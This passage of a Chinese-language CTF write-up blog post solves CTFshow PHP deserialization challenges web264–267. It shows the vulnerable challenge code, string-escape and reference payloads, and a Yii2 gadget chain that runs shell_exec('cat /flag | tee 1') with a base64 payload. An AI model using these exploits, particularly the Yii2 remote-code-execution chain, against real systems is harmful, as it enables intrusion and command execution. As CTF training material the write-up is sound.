+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$umsg</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Your message has been sent&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span></code></pre></div><p>message.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-03 15:13:03
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-03 15:17:17
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">message</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$to</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">from</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">to</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$msg</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">==</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这题是修复了web262的非预期解，也就是可以直接在message.php修改cookie进行反序列化</p>
+<p>所以解法同web262</p>
+<p>payload:</p>
+<pre tabindex="0"><code>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}
+</code></pre><p>注意要在message.php的cookie中加上msg=1</p>
+<p><img alt="image-20250301152439388" loading="lazy" src="../assets/image-20250301152439388.png"></p>
+<h4 id="web265">web265<a hidden class="anchor" aria-hidden="true" href="#web265">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-04 23:52:24
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-05 00:17:08
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshowAdmin</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">=</span><span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(){</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">===</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nv">$ctfshow</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">());</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctfshow</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">()){</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这题指针引用使password恒等于token即可</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="k">class</span> <span class="nc">ctfshowAdmin</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">      <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">          <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">=</span><span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">          <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshowAdmin</span><span class="p">(</span><span class="s2">&#34;我能打上海major&#34;</span><span class="p">,</span><span class="s2">&#34;全场欢呼！DANKING！DANKING！&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></div><h4 id="web266">web266<a hidden class="anchor" aria-hidden="true" href="#web266">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-04 23:52:24
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-05 00:17:08
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$cs</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="nv">$u</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="nv">$p</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(){</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="nv">$ctfshowo</span><span class="o">=@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow/&#39;</span><span class="p">,</span> <span class="nv">$cs</span><span class="p">)){</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Error </span><span class="si">$ctfshowo</span><span class="s2">&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>php大小写不敏感，大小写绕过</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">class</span> <span class="nc">Ctfshow</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Ctfshow</span><span class="p">());</span>
+</span></span></code></pre></div><pre tabindex="0"><code>O:7:&#34;Ctfshow&#34;:0:{}
+</code></pre><h4 id="web267">web267<a hidden class="anchor" aria-hidden="true" href="#web267">#</a></h4>
+<p>考点：Yii2 反序列化漏洞</p>
+<p><img alt="image-20250301204824118" loading="lazy" src="../assets/image-20250301204824118.png"></p>
+<p>有一个登录入口</p>
+<p>弱口令成功登入admin/admin</p>
+<p><img alt="image-20250301204939802" loading="lazy" src="../assets/image-20250301204939802.png"></p>
+<p>在/index.php?r=site%2Fabout处查看源代码看到hint</p>
+<p><img alt="image-20250301205004026" loading="lazy" src="../assets/image-20250301205004026.png"></p>
+<p>访问/index.php?r=site%2Fabout&amp;view-source</p>
+<p><img alt="image-20250301205133641" loading="lazy" src="../assets/image-20250301205133641.png"></p>
+<p>题目给出了入口点</p>
+<p>从源码中我们可以知道这道题用的是yii框架，而且为2.0版本</p>
+<p><img alt="image-20250301212728743" loading="lazy" src="../assets/image-20250301212728743.png"></p>
+<p><a href="https://blog.csdn.net/cosmoslin/article/details/120612714">yii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客</a></p>
+<p>直接用poc总感觉缺了点什么，那自己搓一搓吧，但是过程就不放在这里了</p>
+<pre tabindex="0"><code>&lt;?php
+
+namespace yii\rest{
+    class IndexAction{
+        public $checkAccess;
+        public $id;
+        public function __construct(){
+            $this-&gt;checkAccess = &#39;shell_exec&#39;;
+            $this-&gt;id = &#39;cat /flag | tee 1&#39;;//命令执行
+        }
+    }
+}
+namespace Faker {
+
+    use yii\rest\IndexAction;
+
+    class Generator
+    {
+        protected $formatters;
+
+        public function __construct()
+        {
+            $this-&gt;formatters[&#39;close&#39;] = [new IndexAction(), &#39;run&#39;];
+        }
+    }
+}
+namespace yii\db{
+
+    use Faker\Generator;
+
+    class BatchQueryResult{
+        private $_dataReader;
+        public function __construct()
+        {
+            $this-&gt;_dataReader=new Generator();
+        }
+    }
+}
+namespace{
+
+    use yii\db\BatchQueryResult;
+
+    echo base64_encode(serialize(new BatchQueryResult()));
+}
+</code></pre><p>没回显，用tee将输出复制到1文件中</p>
+<p>payload</p>
+<pre tabindex="0"><code>?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV
+JlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV
+xyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID
+EiO31pOjE7czozOiJydW4iO319fX0=
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>国城杯决赛-Web-Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>CTFSHOW-命令执行-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+    <div class="busuanzi-footer">
+        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
+    </div></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
